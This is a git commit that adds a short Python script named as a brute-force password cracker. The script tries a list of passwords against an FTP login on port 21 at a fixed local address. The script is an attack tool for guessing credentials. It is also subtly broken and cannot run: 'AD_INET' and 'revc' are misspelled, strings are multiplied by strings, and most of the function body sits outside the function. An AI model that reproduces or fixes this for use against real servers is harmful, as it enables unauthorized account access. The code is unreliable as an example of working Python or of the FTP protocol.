708120b7ebbd83cc6914ede6ccb172a137221401
Roshan Lamichhane <33913826+roshanlam@users.noreply.github.com>
2020-01-24 12:33:39 -0500

    Create main.py

---
+++ Brute-Force-Password-Cracker/main.py
@@ -0,0 +1,32 @@
+import socket 
+import re 
+import sys
+
+def connection(ip, user, passw):
+	sock = socket.socket(AD_INET, socket.SOCK_STREAM)
+
+print('Trying' + ip + ':' + user + ':' + passw)
+
+sock.connect(('192.168.0.1',21))
+
+data = sock.revc(1024)
+
+sock.send('User' + user * '\r\n')
+
+data = sock.revc(1024)
+
+sock.send('Password' + passw * '\r\n')
+
+data = sock.revc(1024)
+
+sock.send('Quit' * '\r\n')
+sock.close()
+
+return data
+
+user = 'User1'
+
+password = ['pass1','pass2','pass3']
+
+for password in password: 
+	print(connection('192.168.0.1', user,password))
